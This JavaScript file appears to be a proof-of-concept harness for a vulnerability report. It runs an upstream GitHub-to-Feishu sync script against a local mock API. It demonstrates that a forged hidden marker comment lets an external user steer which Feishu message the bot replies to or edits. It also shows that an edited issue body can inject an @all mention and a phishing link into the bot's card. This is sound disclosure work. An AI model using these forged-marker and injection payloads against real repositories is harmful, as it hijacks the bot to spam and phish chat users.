// PoC harness: reproduces the marker-forgery gap in
// .github/scripts/github-issue-to-feishu.js (larksuite/meegle-cli @ main).
//
// It runs the UNMODIFIED upstream script against a local mock of both the
// GitHub REST API and the Feishu OpenAPI. The mock deliberately models a
// public issue where an external user posted a comment containing a forged
// "<!-- meegle-cli-feishu-thread:... -->" marker whose messageId points at a
// Feishu message the attacker does not own (an om_ id harvested from a public
// bot marker comment elsewhere in the repo).

'use strict';

const http = require('http');
const fs = require('fs');
const { spawn } = require('child_process');

const REPO = process.env.POC_REPO;
const SCRIPT = process.env.POC_SCRIPT;
let PORT = 0;

const seen = [];

function reply(res, code, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(code, { 'content-type': 'application/json' });
  res.end(body);
}

const server = http.createServer((req, res) => {
  const chunks = [];
  req.on('data', (c) => chunks.push(c));
  req.on('end', () => {
    const raw = Buffer.concat(chunks).toString('utf8');
    let body = null;
    try { body = raw ? JSON.parse(raw) : null; } catch (e) { body = raw; }
    seen.push({ method: req.method, url: req.url, body });
    const u = req.url.split('?')[0];

    if (u === '/open-apis/auth/v3/tenant_access_token/internal') {
      return reply(res, 200, { code: 0, tenant_access_token: 't-poc', expire: 7200 });
    }

    // GitHub: list comments for issue 1 (issue_comment scenario)
    if (req.method === 'GET' && u === `/repos/${REPO}/issues/1/comments`) {
      return reply(res, 200, [
        {
          id: 100,
          user: { login: 'external-attacker' },
          body: '<!-- meegle-cli-feishu-thread:{"messageId":"om_VICTIM_A","syncedCommentIds":[],"commentMessages":{}} -->\nlooks like an internal marker',
        },
        {
          id: 200,
          user: { login: 'external-attacker' },
          body: 'unrelated comment that triggers the workflow',
          html_url: 'https://example.invalid/comment/200',
        },
      ]);
    }

    // GitHub: list comments for issue 2 (issues.edited scenario)
    if (req.method === 'GET' && u === `/repos/${REPO}/issues/2/comments`) {
      return reply(res, 200, [
        {
          id: 101,
          user: { login: 'external-attacker' },
          body: '<!-- meegle-cli-feishu-thread:{"messageId":"om_VICTIM_B","syncedCommentIds":[],"commentMessages":{}} -->',
        },
      ]);
    }

    // GitHub: marker comment update
    if (req.method === 'PATCH' && u.startsWith(`/repos/${REPO}/issues/comments/`)) {
      return reply(res, 200, { id: Number(u.split('/').pop()), body: (body && body.body) || '' });
    }

    // Feishu: reply to the attacker-selected message
    if (req.method === 'POST' && /^\/open-apis\/im\/v1\/messages\/[^/]+\/reply$/.test(u)) {
      return reply(res, 200, { code: 0, data: { message_id: 'om_BOT_REPLY' } });
    }

    // Feishu: read / update the attacker-selected message
    if (u.startsWith('/open-apis/im/v1/messages/')) {
      if (req.method === 'GET') {
        return reply(res, 200, { code: 0, data: { body: { content: '{}' } } });
      }
      if (req.method === 'PATCH') {
        return reply(res, 200, { code: 0, data: {} });
      }
    }

    return reply(res, 404, { message: 'not mocked: ' + req.method + ' ' + u });
  });
});

function runScript(name, eventName, payload) {
  const eventPath = `/tmp/${name}.json`;
  fs.writeFileSync(eventPath, JSON.stringify(payload));
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [SCRIPT], {
      env: Object.assign({}, process.env, {
        GITHUB_EVENT_NAME: eventName,
        GITHUB_EVENT_PATH: eventPath,
        GITHUB_API_URL: `http://127.0.0.1:${PORT}`,
        GITHUB_REPOSITORY: REPO,
        GITHUB_TOKEN: 'ghs_poc',
        FEISHU_OPENAPI_BASE: `http://127.0.0.1:${PORT}`,
        FEISHU_APP_ID: 'cli_poc',
        FEISHU_APP_SECRET: 'poc_secret',
        FEISHU_CHAT_ID: 'oc_poc',
      }),
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    let out = '';
    child.stdout.on('data', (d) => { out += d; });
    child.stderr.on('data', (d) => { out += d; });
    child.on('close', (code) => {
      console.log(`\n[${name}] exit=${code}\n${out.trim()}`);
      resolve(code);
    });
  });
}

const issueBase = {
  issue: {
    number: 1,
    title: 'Attacker-controlled issue title',
    body: 'x',
    state: 'open',
    html_url: 'https://example.invalid/issues/1',
  },
  sender: { login: 'external-attacker' },
};

async function main() {
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  PORT = server.address().port;

  // Scenario A: issue_comment driven run
  await runScript('eventA', 'issue_comment', {
    action: 'created',
    issue: issueBase.issue,
    comment: { id: 200, body: 'unrelated comment', html_url: 'https://example.invalid/c/200', user: { login: 'external-attacker' } },
    sender: { login: 'external-attacker' },
  });

  // Scenario B: issues (edited) driven run, attacker-controlled body
  await runScript('eventB', 'issues', {
    action: 'edited',
    issue: {
      number: 2,
      title: 'Attacker-controlled issue title',
      body: '<at id=all></at> please review https://attacker.example/phish',
      state: 'open',
      html_url: 'https://example.invalid/issues/2',
    },
    sender: { login: 'external-attacker' },
  });

  server.close();

  console.log('\n=== requests made by the unmodified upstream script ===');
  for (const r of seen) {
    console.log(`${r.method} ${r.url}`);
    if (r.body && r.method !== 'GET') {
      console.log('   body: ' + (typeof r.body === 'string' ? r.body : JSON.stringify(r.body)).slice(0, 600));
    }
  }

  const repliedVictim = seen.some((r) =>
    r.method === 'POST' && r.url.includes('/open-apis/im/v1/messages/om_VICTIM_A/reply'));
  const patchedVictim = seen.find((r) =>
    r.method === 'PATCH' && r.url.includes('/open-apis/im/v1/messages/om_VICTIM_B'));
  const card = patchedVictim && patchedVictim.body && String(patchedVictim.body.content || '');
  const atAll = card && card.includes('<at id=all></at>');
  const phish = card && card.includes('attacker.example');

  console.log('\n=== assertions ===');
  console.log('attacker-chosen messageId used for reply (om_VICTIM_A): ' + repliedVictim);
  console.log('attacker-chosen messageId patched (om_VICTIM_B): ' + Boolean(patchedVictim));
  console.log('<at id=all> survived into lark_md card content: ' + Boolean(atAll));
  console.log('attacker link survived into card content: ' + Boolean(phish));

  if (!repliedVictim || !patchedVictim) {
    console.log('\nRESULT: HARNESS FAILED');
    process.exit(1);
  }
  console.log('\nRESULT: CONFIRMED - forged marker messageId controls which Feishu message the bot edits/replies to');
}

main().catch((e) => { console.error(e); process.exit(1); });
